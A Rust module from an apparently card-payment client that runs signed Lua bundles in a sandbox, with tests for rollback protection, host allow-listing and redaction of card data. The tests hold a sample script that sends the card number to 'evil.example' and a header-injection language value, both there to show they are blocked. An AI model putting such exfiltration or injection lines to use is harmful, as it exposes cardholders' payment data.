use std::sync::Arc;

use serde::Deserialize;
use serde::de::DeserializeOwned;

use crate::bundle::{self, Bundle, Keys, Reject};
use crate::card::Card;
use crate::fetch::Fetch;
use crate::guard;
use crate::outcome::{Outcome, Reply};
use crate::sandbox::{self, Job, Limits, RunError};
use crate::serial::SerialStore;
use crate::token::TokenReply;

const LANGUAGE_LEN: usize = 35;
const FALLBACK_LANGUAGE: &str = "en-US";

#[derive(Clone, Debug, Deserialize)]
#[serde(untagged)]
pub enum Params {
    Token(TokenParams),
    Bind(BindParams),
}

#[derive(Clone, Debug, Deserialize)]
pub struct BindParams {
    pub public_token: String,
    #[serde(default)]
    pub widget_name: Option<String>,
}

#[derive(Clone, Debug, Deserialize)]
pub struct TokenParams {
    pub public_api_key: String,
    pub checkout_session: String,
    pub tz_offset: i32,
    pub language: String,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Kind {
    Bind,
    Token,
}

impl Kind {
    pub fn entry(self) -> &'static str {
        match self {
            Kind::Bind => "bind",
            Kind::Token => "token",
        }
    }
}

impl Params {
    pub fn kind(&self) -> Kind {
        match self {
            Params::Bind(_) => Kind::Bind,
            Params::Token(_) => Kind::Token,
        }
    }
}

#[derive(Clone)]
pub struct Session {
    inner: Arc<Inner>,
}

struct Inner {
    script: String,
    hosts: Vec<String>,
    params: Params,
    fetch: Arc<dyn Fetch>,
}

pub fn open(
    bundle: Bundle,
    params: Params,
    keys: &Keys,
    serials: &SerialStore,
    now: i64,
    fetch: Arc<dyn Fetch>,
) -> Result<Session, Reject> {
    bundle::check(&bundle, keys, now, serials.highest())?;
    if bundle.entry != params.kind().entry() {
        return Err(Reject::Entry);
    }
    serials
        .record(bundle.serial)
        .map_err(|_| Reject::SerialNotSaved)?;
    Ok(Session {
        inner: Arc::new(Inner {
            script: bundle.script,
            hosts: bundle.allowed_hosts,
            params,
            fetch,
        }),
    })
}

impl Session {
    pub fn kind(&self) -> Kind {
        self.inner.params.kind()
    }

    pub fn takes_page(&self, url: &str) -> bool {
        self.kind() == Kind::Token && guard::page_near(url, &self.inner.hosts)
    }

    pub async fn bind(&self, card: Card) -> Result<Outcome, RunError> {
        self.run::<Reply>(Kind::Bind, "bind", Some(card))
            .await
            .map(Outcome::from)
    }

    pub async fn status(&self) -> Result<Outcome, RunError> {
        self.run::<Reply>(Kind::Bind, "status", None)
            .await
            .map(Outcome::from)
    }

    pub(crate) async fn token(&self, card: Card) -> Result<TokenReply, RunError> {
        self.run(Kind::Token, "token", Some(card)).await
    }

    async fn run<T: DeserializeOwned + Send + 'static>(
        &self,
        kind: Kind,
        action: &'static str,
        card: Option<Card>,
    ) -> Result<T, RunError> {
        if self.kind() != kind {
            return Err(RunError::Sandbox("kind".into()));
        }
        let inner = self.inner.clone();
        tokio::task::spawn_blocking(move || inner.run(action, card))
            .await
            .map_err(|_| RunError::Sandbox("worker".into()))?
    }
}

impl Inner {
    fn run<T: DeserializeOwned>(&self, action: &str, card: Option<Card>) -> Result<T, RunError> {
        let tz_offset;
        let mut inputs = vec![("action", action)];
        match &self.params {
            Params::Bind(bind) => {
                inputs.push(("public_token", bind.public_token.as_str()));
                if let Some(widget) = &bind.widget_name {
                    inputs.push(("widget_name", widget.as_str()));
                }
            }
            Params::Token(token) => {
                tz_offset = token.tz_offset.to_string();
                inputs.extend([
                    ("public_api_key", token.public_api_key.as_str()),
                    ("checkout_session", token.checkout_session.as_str()),
                    ("tz_offset", tz_offset.as_str()),
                    ("language", language(&token.language)),
                ]);
            }
        }
        if let Some(card) = &card {
            inputs.extend([
                ("number", card.number.as_str()),
                ("expiry", card.expiry.as_str()),
                ("cvv", card.cvv.as_str()),
            ]);
        }
        let job = Job {
            script: &self.script,
            inputs: &inputs,
            hosts: &self.hosts,
            fetch: self.fetch.clone(),
            limits: Limits::default(),
        };
        sandbox::run::<T>(job).map_err(|error| redacted(error, card.as_ref()))
    }
}

fn language(raw: &str) -> &str {
    let clean = !raw.is_empty()
        && raw.len() <= LANGUAGE_LEN
        && raw.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-');
    if clean { raw } else { FALLBACK_LANGUAGE }
}

fn redacted(error: RunError, card: Option<&Card>) -> RunError {
    let (RunError::Script(text), Some(card)) = (&error, card) else {
        return error;
    };
    let clean = card
        .secrets()
        .into_iter()
        .filter(|secret| secret.len() >= 3)
        .fold(text.clone(), |text, secret| text.replace(secret, "***"));
    RunError::Script(clean)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::bundle::tests::{key, keys, sample, signed};
    use crate::outcome::State;
    use crate::testkit::{self, FakeSg, HOSTS, NUMBER};

    fn params() -> Params {
        testkit::bind_params()
    }

    fn bundle(serial: i64) -> Bundle {
        let mut bundle = sample(testkit::BIND_LUA, &HOSTS);
        bundle.serial = serial;
        signed(bundle, &key(1))
    }

    fn fetch() -> Arc<FakeSg> {
        FakeSg::new(testkit::SUCCEEDED, &[testkit::SUCCEEDED])
    }

    #[test]
    fn an_older_bundle_is_refused_after_a_newer_one_was_seen_even_after_a_restart() {
        let serials = testkit::serials("rollback");
        assert!(open(bundle(10), params(), &keys(1), &serials, 1_000, fetch()).is_ok());
        let after_restart = SerialStore::at(serials_path("rollback"));
        let old = open(
            bundle(9),
            params(),
            &keys(1),
            &after_restart,
            1_000,
            fetch(),
        );
        assert_eq!(old.err(), Some(Reject::OldSerial));
        assert!(
            open(
                bundle(10),
                params(),
                &keys(1),
                &after_restart,
                1_000,
                fetch()
            )
            .is_ok()
        );
        assert!(
            open(
                bundle(11),
                params(),
                &keys(1),
                &after_restart,
                1_000,
                fetch()
            )
            .is_ok()
        );
        assert_eq!(after_restart.highest(), 11);
    }

    fn serials_path(name: &str) -> std::path::PathBuf {
        std::env::temp_dir()
            .join(format!("boosty-card-{name}-{}", std::process::id()))
            .join("serial")
    }

    #[test]
    fn a_refused_bundle_does_not_move_the_serial() {
        let serials = testkit::serials("refused");
        let mut forged = bundle(50);
        forged.script.push(' ');
        assert_eq!(
            open(forged, params(), &keys(1), &serials, 1_000, fetch()).err(),
            Some(Reject::BadSignature)
        );
        assert_eq!(serials.highest(), 0);
        assert_eq!(
            open(bundle(5), params(), &keys(2), &serials, 1_000, fetch()).err(),
            Some(Reject::BadSignature)
        );
        assert_eq!(
            open(bundle(5), params(), &keys(1), &serials, 5_000, fetch()).err(),
            Some(Reject::Expired)
        );
        assert_eq!(serials.highest(), 0);
    }

    #[tokio::test]
    async fn a_script_that_calls_a_foreign_host_never_sends_the_card() {
        let sg = fetch();
        let script = r#"return http({ url = "https://evil.example/c?n=" .. inputs.number })"#;
        let session = testkit::session_with(script, sg.clone(), "foreign");
        let result = session.bind(testkit::card()).await;
        assert_eq!(
            result.err(),
            Some(RunError::Denied(crate::guard::Denied::ForeignHost))
        );
        assert!(sg.seen.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn a_script_error_never_echoes_the_card() {
        let script = r#"error("declined " .. inputs.number .. " cvv " .. inputs.cvv)"#;
        let session = testkit::session_with(script, fetch(), "echo");
        let text = match session.bind(testkit::card()).await {
            Err(RunError::Script(text)) => text,
            other => panic!("{other:?}"),
        };
        assert!(
            !text.contains(NUMBER) && !text.contains(testkit::CVV),
            "{text}"
        );
        assert!(text.contains("declined"));
    }

    #[tokio::test]
    async fn the_real_bind_script_walks_the_widget_and_asks_for_the_bank_page() {
        let sg = FakeSg::new(testkit::REDIRECT, &[]);
        let session = testkit::session(sg.clone(), "bind-redirect");
        let outcome = session.bind(testkit::card()).await.unwrap();
        assert_eq!(outcome.state, State::Redirect);
        assert_eq!(
            outcome.url.as_deref(),
            Some("https://acs.payeko.ru/3ds?id=1")
        );
        assert_eq!(
            sg.paths(),
            [
                "/widget/v1/init",
                "/cds/v1/tokenize/elements",
                "/cds/v1/tokenize/elements",
                "/cds/v1/tokenize/elements",
                "/cds/v1/tokenize/elements",
                "/widget/v1/payment"
            ]
        );
    }

    #[tokio::test]
    async fn an_empty_card_field_stops_the_bind_script_before_any_request() {
        let sg = FakeSg::new(testkit::REDIRECT, &[]);
        let session = testkit::session(sg.clone(), "empty-field");
        let mut card = testkit::card();
        card.cvv.clear();
        let outcome = session.bind(card).await.unwrap();
        assert_eq!(outcome.reason.as_deref(), Some("input"));
        assert!(sg.seen.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn the_card_goes_only_into_tokenize_bodies_on_the_allowed_host() {
        let sg = FakeSg::new(testkit::REDIRECT, &[]);
        let session = testkit::session(sg.clone(), "where-card-goes");
        let outcome = session.bind(testkit::card()).await.unwrap();
        let mut carriers = vec![];
        for request in sg.seen.lock().unwrap().iter() {
            let url = Url::parse(&request.url).unwrap();
            assert_eq!(url.host_str(), Some("proxy-ee.smart-glocal.com"));
            let body = String::from_utf8_lossy(&request.body).to_string();
            let headers = format!("{:?}", request.headers);
            assert!(
                !request.url.contains(NUMBER)
                    && !headers.contains(NUMBER)
                    && !headers.contains(testkit::CVV)
            );
            assert!(headers.contains("public-token"));
            if body.contains(NUMBER) || body.contains(testkit::CVV) {
                carriers.push(url.path().to_string());
            }
            if body.contains("\"cardholder\"") {
                assert!(body.contains("\"CARD HOLDER\""), "{body}");
            }
        }
        assert_eq!(carriers, ["/cds/v1/tokenize/elements"; 2]);
        let shown = format!("{outcome:?}");
        assert!(!shown.contains(NUMBER));
    }

    #[test]
    fn a_bundle_runs_only_with_the_params_of_its_entry() {
        let serials = testkit::serials("entry");
        let mut token = sample(testkit::YUNO_LUA, &testkit::YUNO_HOSTS);
        token.entry = "token".into();
        let token = signed(token, &key(1));
        assert_eq!(
            open(token.clone(), params(), &keys(1), &serials, 1_000, fetch()).err(),
            Some(Reject::Entry)
        );
        assert_eq!(
            open(
                bundle(5),
                testkit::yuno_params(),
                &keys(1),
                &serials,
                1_000,
                fetch()
            )
            .err(),
            Some(Reject::Entry)
        );
        assert_eq!(serials.highest(), 0);
        let session = open(
            token,
            testkit::yuno_params(),
            &keys(1),
            &serials,
            1_000,
            fetch(),
        );
        assert_eq!(session.map(|s| s.kind()).ok(), Some(Kind::Token));
    }

    #[test]
    fn params_from_pay_pick_their_kind_and_a_null_widget_is_fine() {
        let bind: Params = serde_json::from_str(
            r#"{"provider":"sg","payment_id":1,"public_token":"p","widget_name":null}"#,
        )
        .unwrap();
        assert!(matches!(&bind, Params::Bind(b) if b.widget_name.is_none()));
        let token: Params = serde_json::from_str(
            r#"{"provider":"yuno","public_api_key":"k","checkout_session":"c","tz_offset":-180,"language":"ru-RU"}"#,
        )
        .unwrap();
        assert_eq!(token.kind(), Kind::Token);
        assert!(
            serde_json::from_str::<Params>(r#"{"provider":"yuno","public_api_key":"k"}"#).is_err()
        );
    }

    #[test]
    fn only_a_clean_language_tag_reaches_the_script() {
        assert_eq!(language("ru-RU"), "ru-RU");
        assert_eq!(language("en\r\nX-Evil: 1"), FALLBACK_LANGUAGE);
        assert_eq!(language(""), FALLBACK_LANGUAGE);
    }

    #[test]
    fn a_token_session_opens_bank_pages_only_near_its_hosts() {
        let session = testkit::yuno_session(
            testkit::FakeYuno::new(200, serde_json::json!({})),
            "page-near",
        );
        assert!(session.takes_page("https://checkout.y.uno/payment?session=s1&3ds=true"));
        assert!(!session.takes_page("https://evil.example/"));
        let bind = testkit::session(fetch(), "page-bind");
        assert!(!bind.takes_page("https://proxy-ee.smart-glocal.com/"));
    }

    use url::Url;
}
